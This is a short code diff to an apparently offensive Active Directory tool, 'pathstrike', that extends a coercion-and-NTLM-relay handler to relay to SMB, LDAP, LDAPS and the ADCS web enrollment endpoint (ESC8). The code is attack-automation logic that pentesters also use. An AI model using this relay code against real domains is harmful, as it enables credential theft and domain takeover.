@@ -36,7 +36,14 @@ from pathstrike.tools.coercion_wrapper import (
 from pathstrike.tools import ntlmrelayx_wrapper as relay
 
 
-@register_handler("CoerceAndRelayTo", "CoerceAndRelayNTLMToSMB")
+@register_handler(
+    "CoerceAndRelayTo",
+    "CoerceAndRelayNTLMToSMB",
+    "CoerceAndRelayNTLMToLDAP",
+    "CoerceAndRelayNTLMToLDAPS",
+    "CoerceAndRelayNTLMToADCS",
+    "CoerceToTGT",
+)
 class CoerceAndRelayHandler(BaseEdgeHandler):
     """Exploit authentication coercion + NTLM relay.
 
@@ -91,12 +98,19 @@ class CoerceAndRelayHandler(BaseEdgeHandler):
         # Target node = relay destination
         target_host = edge.target.name.split("@")[0]
 
-        # Determine relay mode based on edge type and target
-        is_smb_relay = edge.edge_type == "CoerceAndRelayNTLMToSMB"
-        if is_smb_relay:
+        # Determine relay mode based on edge type
+        edge_type = edge.edge_type
+        if edge_type == "CoerceAndRelayNTLMToSMB":
             relay_url = f"smb://{target_host}"
+        elif edge_type == "CoerceAndRelayNTLMToLDAPS":
+            relay_url = f"ldaps://{dc_ip}"
+        elif edge_type == "CoerceAndRelayNTLMToADCS":
+            # ESC8: relay to ADCS HTTP enrollment endpoint
+            relay_url = f"http://{target_host}/certsrv/certfnsh.asp"
         else:
+            # Default: LDAP relay (CoerceAndRelayTo, CoerceAndRelayNTLMToLDAP, CoerceToTGT)
             relay_url = f"ldap://{dc_ip}"
+        is_smb_relay = "SMB" in edge_type
 
         if dry_run:
             return (
